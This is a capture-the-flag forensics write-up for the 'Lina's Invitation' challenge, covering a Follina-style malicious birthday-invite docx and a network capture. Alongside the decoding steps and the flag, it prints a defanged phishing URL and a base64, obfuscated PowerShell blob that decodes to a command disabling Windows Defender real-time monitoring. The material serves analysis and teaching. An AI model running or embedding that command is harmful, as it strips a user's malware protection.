# Lina's Invitation

## TOC
- [Prompt](#prompt)
- [Files](#files)
- [Tools Used](#tools-used)
- [The Birthday Invite](#the-birthday-invite)
- [Using olevba on the Invite](#using-olevba-on-the-invite)
- [Unzipping the Docx](#unzipping-the-docx)
- [Using oletools on Contents](#using-oletools-on-contents)
- [Phising Site](#phishing-site)
- [Possible Initial Payload](#possible-initial-payload)
- [Alex Has Been Pwnd](#alex-has-been-pwnd)
- [HTML Payload](#html-payload)
- [olevba Finding](#olevba-finding)
- [B64 Encoded Powershell](#b64-encoded-powershell)
- [Assembled Flag](#assembled-flag)
- [TLDR](#tldr)

## Prompt
A CEO of a startup company reported that he could no longer access his Password Vault. It seems the password has been changed, but he states not to have done so. He reports receiving a birthday invitation to a Paintball party the last week. A few days later, his Italian friend told him that her email had been hacked and never sent out those birthday invites. He fears his lost password might have something to do with that birthday invite. Their SOC team confirmed their assumptions by admitting that this document escaped their attention and did not trigger any alert. Now they want us, ENIGMA, to analyze the provided network capture they took on the day and the document sent via his friends' email.

## Files
- birthday_invite.docx
- capture.pcapng

## Tools Used
- https://github.com/decalage2/oletools

## The Birthday Invite

Remember writing birthday invites in Microsoft Word? Me neither! But let's throw this into a sandboxed Windows instance and check it out.

![Birthday Invite](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_birthday_invite.png)

There's not much to go on here, except a link, but clicking it only Rick Roll's us (as does pretty much any other link/domain/host in this challenge). Is it bad that I'm less annoyed at the idea of clicking a malicious link than I am clicking a Rick Roll link? Anyway, let's get to work.

### Using olevba on the Invite

For this challenge, we're going to get familiar with the OLE Tools suite (link above). Side note: thanks for the pre-ctf presentation on this, because it was the first time I've heard of it and it's really fun to play around with! 

Running `olevba` on the provided docx file doesn't reveal anything malicious. Hmm...

![olevba on Birthday Invite](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_olevba_on_doc.png)

### Unzipping the Docx 

Checking out google reveals something fun that I've somehow *just* managed to learn (and can't believe I hadn't learned before): you can unzip .docx files as if they were a zip folder (along with most other Microsoft file formats). Feels a lot like Chromeminer in here now.

Unzipping the docx file reveals lots more juicy content to play with. 

![Unzipping the Doc](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_unzip_doc.png)

### Using oletools on Contents

At this point, you can poke around at each file with oletools, but we'll cut to the point. Runnig `olevba` on `document.xml.rels` finally reveals something suspicious. 
![Using oletools on Contents](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_using_oletools_on_contents.png)

`hxxp://windowsliveupdater.com?Pt2=RjBsbGluYV9oNHNf-->`

Let's snag that URL and save it for later. For now, let's go check out our PCAP file.

## PCAP Analysis

### Phishing site

Right up at the top of the PCAP, we see DNS query for the same site from the `document.xml.rels` finding. Fun stuff! Did someone get phished? Let's follow all traffic with that host.

![Phishing Site](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_phishing_site.png)

### Possible Initial Payload

To make our work simpler, let's filter by HTTP protocol, then peak at each HTTP stream. Doing so reveals what looks like a possible initial payload delivered to our innocent CEO. This is going into the To-Analyze list.

![Possible Initial Payload](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_1.png)

### Alex Has Been Pwnd

Moving forward and looking at TCP streams, we find a really juicy stream. Our attacker is doing some host enumeration, and has even pwnd Alex's password vault. Oh! And they also left us some b64 encoded powershell to check out! Thanks <3!

![Alex Has Been Pwnd](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_2.png)

```b64
LgAgACgAIAAkAGUAbgBWADoAYwBvAG0AUwBwAGUAYwBbADQALAAyADQALAAyADUAXQAtAEoATwBpAG4AJwAnACkAIAAoACAAKAAoACgAIgB7ADIAfQB7ADAAfQB7ADcAfQB7ADEAfQB7ADEAMQB9AHsANQB9AHsANgB9AHsAOQB9AHsAMQAwAH0AewA0AH0AewA4AH0AewAzAH0AIgAtAGYAIAAnAGUAZgAnACwAJwAgACcALAAnAFMAZQB0AC0ATQBwAFAAcgAnACwAJwB1AGUAJwAsACcAdAAnACwAJwBhAGwAdABpAG0AZQAnACwAJwBNAG8AbgBpACcALAAnAGUAcgBlAG4AYwBlACcALAAnAHIAJwAsACcAdABvAHIAJwAsACcAaQBuAGcAIABLADMANQAnACwAJwAtAEQAaQBzAGEAYgBsAGUAUgBlACcAKQApACAALQByAGUAcABMAGEAYwBFACAAIAAnAEsAMwA1ACcALABbAEMAaABBAFIAXQAzADYAKQApAA==
```

## Actual Forensics

We can keep combing through the PCAP forever if we like, but we won't find much else. So, we'll dig into the IOCs we have so far.

### HTML Payload

For the 'possibly initial payload' IOC, we can use cyberchef to URI decode it, which gives us a heavily encoded html page, but with one particularly sketchy href.

![Forensics - IOC 1-1](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_forensics_ioc_1_1.png)

We can take the b64 string out of there, throw it in Cyberchef and remove null bytes, and get the first part of the flag.

![Forensics - IOC 1-2](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_1_2.png)

- flag pt 1 = `HTB{Zer0_DayZ_4Re_C0Ol_BuT_`

### olevba Finding

Remember the url that `olevba` turned up earlier? It's got some b64 in it as well, so let's toss that into Cyberchef too and get the second part of the flag.

![Forensics - IOC 3](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc3.png)
- flag pt 2 = `F0llina_h4s_`

### B64 Encoded Powershell

Moving on to the moment Alex was pwnd, we repeat the same process with the encoded powershell...

![Forensics - IOC 2-1](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc2_1.png)

Back on our sandboxed Windows machine, we fire up Powershell ISE, remove `IEX` from the command (because, remember, we *don't* want execution kids, just strings) and get the final part of the flag.

![Forensics - IOC 2-2](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc2_2.png)

- flag pt 3 = `b33n_pAtch3d!}`

## Assembled flag
- `HTB{Zer0_DayZ_4Re_C0Ol_BuT_F0llina_h4s_B33N_PaTCH3D!}`

# TLDR
1. Unzip birthday_invite.docx
2. Run `olevba /word/_rels/document.xml.rels` and decode b64 from url to get flag.pt2
3. PCAP analysis
4. Find HTTP PCAP w/ URI encoded payload
5. Decode URI & find another b64 string
6. Decode b64 string to get flag.pt1
7. Find TCP PCAP w/ b64 encoded powershell
8. Decode & throw into Powershell ISE w/ `IEX` removed to get flag.pt3


[Back to TOC](#toc)
